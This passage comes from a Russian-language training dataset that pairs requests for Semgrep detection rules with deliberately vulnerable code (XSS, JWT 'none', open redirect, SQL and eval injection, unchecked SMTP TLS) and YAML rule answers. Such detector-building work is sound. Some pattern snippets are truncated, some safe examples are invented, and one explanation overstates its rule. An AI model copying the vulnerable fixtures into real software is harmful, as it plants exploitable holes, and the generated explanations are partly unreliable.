href=\"#\" style=\"display: none;\"><%= I18n.t(\"gws/reminder.links.restore_reminder\") %></a>\n</div>\n\n</html>  # Ограничиваем длину\n\nОпасные паттерны:\n• <a href=\"<%= link %>\">Click me</a>\n• <a href=<%= link %> >Click me</a>\n\nБезопасные паттерны:  \n• <a href=\"/<%= link %>\">Click me</a>\n• <a href='#'>Click me</a>\n• <a href=\"#\">Click me</a>\n\nЛегенда аннотаций:\n- // ruleid:var-in-href: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:var-in-href: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: var-in-href\n  message: >-\n    Detected a template variable used in an anchor tag with\n    the 'href' attribute. This allows a malicious actor to\n    input the 'javascript:' URI and is subject to cross-\n    site scripting (XSS) attacks. If using a relative URL,\n    start with a literal forward slash and concatenate the URL,\n    like this: href='/<%= link =>'. You may also consider setting\n    the Content Security Policy (CSP) header.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://flask.palletsprojects.com/en/1.1.x/security/#cross-site-scripting-xss#:~:text=javascript:%20URI\n    - https://github.com/pugjs/pug/issues/2952\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - generic\n  paths:\n    include:\n    - '*.erb'\n  severity: WARNING\n  pattern-either:\n  - pattern: <a ... href = \"<%= ... %>\" ... >\n  - pattern: <a ... href = '<%= ... %>' ... >\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменной шаблона внутри атрибута 'href' тегов 'a'. Это позволяет злоумышленникам вводить вредоносный контент, например, 'javascript:', что может привести к атакам XSS. Правило использует оператор 'pattern-either', который ищет два возможных формата записи атрибутов 'href': с двойными кавычками и с одинарными кавычками. В обоих случаях наличие переменной шаблона (<%= ... %>) рассматривается как потенциальная угроза.\n\n# Ключевые элементы:\n- ID: var-in-href\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "var-in-href",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения mako-templates-detected\nОписание уязвимости: Mako templates do not provide a global HTML escaping mechanism. This means you must escape all sensitive data in your templates using '| u' for URL escaping or '| h' for HTML escaping. If you are using Mako to serve web content, consider using a system such as Jinja2 which enables global escaping.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: INFO\n\nКонтекст кода:\n// File: mako-templates-detected.py\nfrom mako.template import Template\nfrom mako import template\nimport mako\nimport jinja2\n\n# ruleid:mako-templates-detected\nmako.template.Template(\"hern\")\n# ruleid:mako-templates-detected\ntemplate.Template(\"hern\")\n# ruleid:mako-templates-detected\nTemplate(\"hello\")\n\n# ok:mako-templates-detected\nt = jinja2.Template(\"Hello {{ name }}\")\nt.render(name=\"world!\")  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: mako-templates-detected.py\nmako.template.Template(\"hern\")\n• // File: mako-templates-detected.py\ntemplate.Template(\"hern\")\n• // File: mako-templates-detected.py\nTemplate(\"hello\")\n\nБезопасные паттерны:  \n• // File: mako-templates-detected.py\nt = jinja2.Template(\"Hello {{ name }}\")\nt.render(name=\"world!\")\n\nЛегенда аннотаций:\n- // ruleid:mako-templates-detected: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:mako-templates-detected: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: mako-templates-detected\n  pattern: mako.template.Template(...)\n  message: >-\n    Mako templates do not provide a global HTML escaping mechanism.\n    This means you must escape all sensitive data in your templates\n    using '| u' for URL escaping or '| h' for HTML escaping.\n    If you are using Mako to serve web content, consider using\n    a system such as Jinja2 which enables global escaping.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    source-rule-url: https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/bandit/plugins/mako_templates.py\n    references:\n    - https://docs.makotemplates.org/en/latest/syntax.html#expression-escaping\n    - https://jinja.palletsprojects.com/en/2.11.x/intro/#\n    category: security\n    technology:\n    - mako\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [python]\n  severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования шаблонов Mako в Python-коде. Паттерн ищет вызовы функций mako.template.Template(), template.Template() и Template(). Эти функции не обеспечивают глобального механизма экранирования HTML, что требует ручного экранирования чувствительных данных с использованием специальных маркеров '| u' или '| h'. Правило рекомендует использовать альтернативную систему шаблонов, такую как Jinja2, которая поддерживает глобальное экранирование.\n\n# Ключевые элементы:\n- ID: mako-templates-detected\n- Язык: python \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "mako-templates-detected",
      "language": "python",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: azure-postgresql-server-connection-throttling-enabled\nОписание уязвимости: Ensure server parameter connection_throttling is set to ON for PostgreSQL Database Server\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-postgresql-server-connection-throttling-enabled.tf\n# fail\n# ruleid: azure-postgresql-server-connection-throttling-enabled\nresource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"connection_throttling\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"off\"\n}\n\n# pass\nresource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"connection_throttling\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"on\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"connection_throttling\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_serv\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"connection_throttling\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_serv\n\nБезопасные паттерны:  \n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"connection_throttling\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.ex\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"connection_throttling\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.ex\n\nЛегенда аннотаций:\n- // ruleid:azure-postgresql-server-connection-throttling-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-postgresql-server-connection-throttling-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-postgresql-server-connection-throttling-enabled\n    message: >-\n      Ensure server parameter connection_throttling is set to ON for PostgreSQL Database Server\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_postgresql_configuration\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_postgresql_configuration\" \"...\" {\n          ...\n          name = \"connection_throttling\"\n          value = \"on\"\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure PostgreSQL сервера, где параметр 'connection_throttling' не установлен в значение 'ON'. Анализ выполняется путем поиска ресурса типа 'azurerm_postgresql_configuration', внутри которого проверяется наличие имени параметра 'connection_throttling' и значения, отличного от 'on'. Правило использует оператор NOT INSIDE для исключения случаев, когда параметр уже установлен корректно.\n\n# Ключевые элементы:\n- ID: azure-postgresql-server-connection-throttling-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-postgresql-server-connection-throttling-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения insecure-smtp-connection\nОписание уязвимости: Insecure SMTP connection detected. This connection will trust any SSL certificate. Enable certificate verification by setting 'email.setSSLCheckServerIdentity(true)'.\nCWE: CWE-297: Improper Validation of Certificate with Host Mismatch\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-297: Improper Validation of Certificate with Host Mismatch\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-smtp-connection.java\npublic class Cls {\n\n    // cf. https://find-sec-bugs.github.io/bugs.htm#INSECURE_SMTP_SSL\n    public void sendEmail(String username, String password) {\n        Email email = new SimpleEmail();\n        email.setHostName(\"smtp.servermail.com\");\n        email.setSmtpPort(465);\n        email.setAuthenticator(new DefaultAuthenticator(username, password));\n        email.setSSLOnConnect(true);\n        email.setFrom(\"user@gmail.com\");\n        email.setSubject(\"TestMail\");\n        email.setMsg(\"This is a test mail ... :-)\");\n        email.addTo(\"foo@bar.com\");\n        // ruleid:insecure-smtp-connection\n        email.send();\n    }\n\n    public void sendEmailSafe(String username, String password) {\n        Email email = new SimpleEmail();\n        email.setHostName(\"smtp.servermail.com\");\n        email.setSmtpPort(465);\n        email.setAuthenticator(new DefaultAuthenticator(username, password));\n        email.setSSLOnConnect(true);\n        email.setSSLCheckServerIdentity(true);\n        email.setFrom(\"user@gmail.com\");\n        email.setSubject(\"TestMail\");\n        email.setMsg(\"This is a test mail ... :-)\");\n        email.addTo(\"foo@bar.com\");\n        email.send();\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: insecure-smtp-connection.java\npublic class Cls {\n...\npublic void sendEmail(String username, String password) {\n...\nemail.setSSLOnConnect(true);\n...\nemail.send();\n...\n}\n...}\n• // Another example of insecure usage\npublic class AnotherCls {\n...\npublic void unsafeSend() {\n...\nSimpleEmail email = new SimpleEmail(...);\nemail.setSSLOnConnect(true);\nemail.send();\n...\n}\n\nБезопасные паттерны:  \n• // File: secure-smtp-connection.java\npublic class SecureCls {\n...\npublic void sendEmailSecurely(String username, String password) {\n...\nSimpleEmail email = new SimpleEmail(...);\nemail.setSSLOnConnect(\n• // Example of secure usage\npublic class SecureCls2 {\n...\npublic void secureSend() {\n...\nSimpleEmail email = new SimpleEmail(...);\nemail.setSSLOnConnect(true);\nemail.setSSLCheckServerIdentity(true);\nem\n\nЛегенда аннотаций:\n- // ruleid:insecure-smtp-connection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-smtp-connection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-smtp-connection\n  metadata:\n    cwe:\n    - 'CWE-297: Improper Validation of Certificate with Host Mismatch'\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#INSECURE_SMTP_SSL\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    Insecure SMTP connection detected. This connection will trust any SSL certificate.\n    Enable certificate verification by setting 'email.setSSLCheckServerIdentity(true)'.\n  severity: WARNING\n  patterns:\n  - pattern-not-inside: |\n      $EMAIL.setSSLCheckServerIdentity(true);\n      ...\n  - pattern-inside: |\n      $EMAIL = new SimpleEmail(...);\n      ...\n  - pattern: |-\n      $EMAIL.send(...);\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных соединений SMTP, которые не проверяют сертификат SSL. Анализ выполняется путем поиска конструктора класса SimpleEmail и метода send(). Правило исключает случаи, где явно вызывается метод setSSLCheckServerIdentity(true), указывая на отсутствие проверки сертификата. В опасных примерах отсутствует вызов этого метода, а в безопасных примерах он присутствует.\n\n# Ключевые элементы:\n- ID: insecure-smtp-connection\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-smtp-connection",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения jwt-none-alg\nОписание уязвимости: Detected use of the 'none' algorithm in a JWT token. The 'none' algorithm assumes the integrity of the token has already been verified. This would allow a malicious actor to forge a JWT token that will automatically be verified. Do not explicitly use the 'none' algorithm. Instead, use an algorithm such as 'HS256'.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-none-alg.js\n// ruleid: jwt-none-alg\nconst jose = require(\"jose\");\nconst { JWK, JWT } = jose;\nconst token = JWT.verify('token-here', JWK.None);  # Ограничиваем длину\n\nОпасные паттерны:\n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...JWT.verify(token, JWK.None)\n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...var t = JWT.verify(token, JWK.None)\n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...var t = JWT.verify('token-here', JWK.None)\n\nБезопасные паттерны:  \n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...JWT.verify(token, JWK.HS256)\n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...var t = JWT.verify(token, JWK.HS256)\n• var JOSE = require(\"jose\");...var { JWK, JWT } = JOSE;...JWT.verify('token-here', JWK.HS256)\n\nЛегенда аннотаций:\n- // ruleid:jwt-none-alg: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jwt-none-alg: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jwt-none-alg\n  message: >-\n    Detected use of the 'none' algorithm in a JWT token.\n    The 'none' algorithm assumes the integrity of the token has already\n    been verified. This would allow a malicious actor to forge a JWT token\n    that will automatically be verified. Do not explicitly use the 'none'\n    algorithm. Instead, use an algorithm such as 'HS256'.\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    asvs:\n      section: 'V3: Session Management Verification Requirements'\n      control_id: 3.5.3 Insecue Stateless Session Tokens\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x12-V3-Session-management.md#v35-token-based-session-management\n      version: '4'\n    category: security\n    technology:\n    - jose\n    - jwt\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: HIGH\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  pattern-either:\n  - pattern: |\n      var $JOSE = require(\"jose\");\n      ...\n      var { JWK, JWT } = $JOSE;\n      ...\n      var $T = JWT.verify($P, JWK.None,...);\n  - pattern: |\n      var $JOSE = require(\"jose\");\n      ...\n      var { JWK, JWT } = $JOSE;\n      ...\n      $T = JWT.verify($P, JWK.None,...);\n  - pattern: |\n      var $JOSE = require(\"jose\");\n      ...\n      var { JWK, JWT } = $JOSE;\n      ...\n      JWT.verify($P, JWK.None,...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма 'none' при проверке JWT-токена. Алгоритм 'none' предполагает, что целостность токена уже проверена, что позволяет злоумышленнику подделать JWT-токен, который автоматически будет подтвержден. Правило использует шаблон, включающий оператор pattern-either для поиска различных вариантов синтаксиса JavaScript, где используется функция verify из библиотеки jose для проверки JWT-токенов с использованием алгоритма JWK.None.\n\n# Ключевые элементы:\n- ID: jwt-none-alg\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "jwt-none-alg",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения custom-expression-as-sql\nОписание уязвимости: Detected a Custom Expression ''$EXPRESSION'' calling ''as_sql(...).'' This could lead to SQL injection, which can result in attackers exfiltrating sensitive data. Instead, ensure no user input enters this function or that user input is properly sanitized.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: custom-expression-as-sql.py\nimport django\nfrom django.db.models.aggregates import Aggregate as DjangoAggregate\nfrom django.db.models.sql.aggregates import Aggregate as DjangoSqlAggregate\n\ndef query_as_sql(query, connection):\n    # ruleid: custom-expression-as-sql\n    return query.get_compiler(connection=connection).as_sql()\n\nclass SqlAggregate(DjangoSqlAggregate):\n    conditional_template = '%(function)s(CASE WHEN %(condition)s THEN %(field)s ELSE null END)'\n\n    def __init__(self, col, source=None, is_summary=False, condition=None, **extra):\n        super(SqlAggregate, self).__init__(col, source, is_summary, **extra)\n        self.condition = condition\n\n    def relabel_aliases(self, change_map):\n        if VERSION < (1, 7):\n            super(SqlAggregate, self).relabel_aliases(change_map)\n        if self.has_condition:\n            condition_change_map = dict((k, v) for k, v in \\\n                change_map.items() if k in self.condition.query.alias_map\n            )\n            self.condition.query.change_aliases(condition_change_map)\n\n    def relabeled_clone(self, change_map):\n        self.relabel_aliases(change_map)\n        return super(SqlAggregate, self).relabeled_clone(change_map)\n\n    def as_sql(self, qn, connection):\n        if self.has_condition:\n            self.sql_template = self.conditional_template\n            self.extra['condition'] = self._condition_as_sql(qn, connection)\n\n        # ruleid: custom-expression-as-sql\n        return super(SqlAggregate, self).as_sql(qn, connection)\n\n    @property\n    def has_condition(self):\n        # Warning: bool(QuerySet) will hit the database\n        return self.condition is not None\n\n    def _condition_as_sql(self, qn, connection):\n        '''\n        Return sql for condition.\n        '''\n        def escape(value):\n            if isinstance(value, bool):\n                value = str(int(value))\n            if isinstance(value, six.string_types):\n                # Escape params used with LIKE\n                if  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: custom-expression-as-sql.py\nquery.get_compiler(connection=connection).as_sql()\n• // File: custom-expression-as-sql.py\nsuper(SqlAggregate, self).as_sql(qn, connection)\n• // File: custom-expression-as-sql.py\nreturn sql % tuple(param)\n\nБезопасные паттерны:  \n• // File: safe-code.py\nparam = sanitize_user_input(user_input)\nquery.get_compiler(connection=connection).as_sql(param)\n• // File: safe-code.py\nsql_query = build_safe_sql_query(user_input)\nsuper(SqlAggregate, self).as_sql(sql_query)\n• // File: safe-code.py\ntemplate = get_predefined_template()\ntuple_params = get_sanitized_params(user_input)\nreturn sql % tuple_params\n\nЛегенда аннотаций:\n- // ruleid:custom-expression-as-sql: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:custom-expression-as-sql: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: custom-expression-as-sql\n  languages:\n  - python\n  message: Detected a Custom Expression ''$EXPRESSION'' calling ''as_sql(...).'' This could lead to SQL\n    injection, which can result in attackers exfiltrating sensitive data. Instead, ensure no user input\n    enters this function or that user input is properly sanitized.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.0/ref/models/expressions/#django.db.models.Func.as_sql\n    - https://semgrep.dev/blog/2020/preventing-sql-injection-a-django-authors-perspective/\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  pattern: $EXPRESSION.as_sql(...)\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов метода 'as_sql' с использованием пользовательских выражений ($EXPRESSION), которые могут быть подвержены SQL-инъекциям. Метод 'as_sql' используется для создания SQL-запросов на основе переданных параметров. Если эти параметры содержат неочищенный пользовательский ввод, они могут привести к выполнению нежелательных SQL-команд злоумышленником. Правило ищет вызовы функции 'as_sql', где выражение передается непосредственно в метод, без явной проверки или очистки ввода.\n\n# Ключевые элементы:\n- ID: custom-expression-as-sql\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "custom-expression-as-sql",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: dangerous-testcapi-run-in-subinterp-audit\nОписание уязвимости: Found dynamic content in `run_in_subinterp`. This is dangerous if external data can reach this function call because it allows a malicious actor to run arbitrary Python code. Ensure no external data reaches here.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-testcapi-run-in-subinterp-audit.py\nimport _testcapi\nfrom test import support\n\ndef run_payload1(payload: str) -> None:\n    # ruleid: dangerous-testcapi-run-in-subinterp-audit\n    _testcapi.run_in_subinterp(payload)\n\ndef run_payload2(payload: str) -> None:\n    # ruleid: dangerous-testcapi-run-in-subinterp-audit\n    support.run_in_subinterp(payload)\n\ndef okTest(payload: str) -> None:\n    # ok: dangerous-testcapi-run-in-subinterp-audit\n    _testcapi.run_in_subinterp(\"print('Hello world')\")  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dangerous-testcapi-run-in-subinterp-audit.py\nimport _testcapi\nfrom test import support\ndef run_payload1(payload: str) -> None:\n    # ruleid: dangerous-testcapi-run-in-subinterp-audit\n    _tes\n• // File: dangerous-testcapi-run-in-subinterp-audit.py\nimport _testcapi\nfrom test import support\ndef run_payload2(payload: str) -> None:\n    # ruleid: dangerous-testcapi-run-in-subinterp-audit\n    supp\n\nБезопасные паттерны:  \n• // File: dangerous-testcapi-run-in-subinterp-audit.py\nimport _testcapi\nfrom test import support\ndef okTest(payload: str) -> None:\n    # ok: dangerous-testcapi-run-in-subinterp-audit\n    _testcapi.run_\n• // File: dangerous-testcapi-run-in-subinterp-audit.py\nimport _testcapi\nfrom test import support\ndef anotherSafeFunction(payload: str) -> None:\n    _testcapi.run_in_subinterp('hardcoded_string')\n\nЛегенда аннотаций:\n- // ruleid:dangerous-testcapi-run-in-subinterp-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-testcapi-run-in-subinterp-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-testcapi-run-in-subinterp-audit\n  patterns:\n  - pattern-either:\n    - pattern: |\n        _testcapi.run_in_subinterp($PAYLOAD, ...)\n    - pattern: |\n        test.support.run_in_subinterp($PAYLOAD, ...)\n  - pattern-not: |\n      _testcapi.run_in_subinterp(\"...\", ...)\n  - pattern-not: |\n      test.support.run_in_subinterp(\"...\", ...)\n  message: >-\n    Found dynamic content in `run_in_subinterp`.\n    This is dangerous if external data can reach this function call because it allows\n    a malicious actor to run arbitrary Python code.\n    Ensure no external data reaches here.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  severity: WARNING\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций _testcapi.run_in_subinterp и test.support.run_in_subinterp, которые принимают динамический контент ($PAYLOAD). Паттерны используют оператор 'pattern-either' для объединения двух шаблонов вызова этих функций. Дополнительно применяются отрицательные условия 'pattern-not', исключающие случаи, когда вызовы содержат жестко закодированные строковые аргументы. Правило предупреждает о возможности выполнения произвольного Python-кода при передаче внешних данных.\n\n# Ключевые элементы:\n- ID: dangerous-testcapi-run-in-subinterp-audit\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-testcapi-run-in-subinterp-audit",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: open-redirect\nОписание уязвимости: A query string parameter may contain a URL value that could cause the web application to redirect the request to a malicious website controlled by an attacker. Make sure to sanitize this parameter sufficiently.\nCWE: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nТип анализа: taint\nЯзык: csharp\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: taint\n- CWE: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: open-redirect.cs\n[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Password))\n        {\n            FormsService.SignIn(model.UserName, model.RememberMe);\n            if (!String.IsNullOrEmpty(returnUrl))\n            {\n                // ruleid: open-redirect\n                return Redirect(returnUrl);\n            }\n            else\n            {\n                return RedirectToAction(\"Index\", \"Home\");\n            }\n        }\n        else\n        {\n            ModelState.AddModelError(\"\",\n            \"The user name or password provided is incorrect.\");\n        }\n    }\n}\n\n\n[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Password))\n        {\n            FormsService.SignIn(model.UserName, model.RememberMe);\n            if (IsLocalUrl(returnUrl))\n            {\n                // ok: open-redirect\n                return Redirect(returnUrl);\n            }\n            else\n            {\n                return RedirectToAction(\"Index\", \"Home\");\n            }\n        }\n        else\n        {\n            ModelState.AddModelError(\"\",\n            \"The user name or password provided is incorrect.\");\n        }\n    }\n}\n\n[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Password))\n        {\n            FormsService.SignIn(model.UserName, model.RememberMe);\n            if (Url.IsLocalUrl(returnUrl))\n            {\n                // ok: open-redirect\n                return Redirect(returnUrl);\n            }\n            else\n            {\n                return RedirectToAction(\"Index\", \"Home\");\n            }\n        }\n        else\n        {\n            ModelState.AddModelError(\"\",\n            \"The user nam  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: open-redirect.cs\n[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.\n• // File: another-open-redirect.cs\n[HttpGet]\npublic ActionResult SomeMethod(string urlParam)\n{\n    if (!string.IsNullOrEmpty(urlParam))\n    {\n        // ruleid: open-redirect\n        return Redirect(ur\n\nБезопасные паттерны:  \n• // File: safe-code.cs\n[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Pass\n• // File: secure-code.cs\n[HttpGet]\npublic ActionResult SomeMethod(string urlParam)\n{\n    if (!string.IsNullOrEmpty(urlParam) && IsLocalUrl(urlParam))\n    {\n        // ok: open-redirect\n        return R\n\nЛегенда аннотаций:\n- // ruleid:open-redirect: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:open-redirect: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
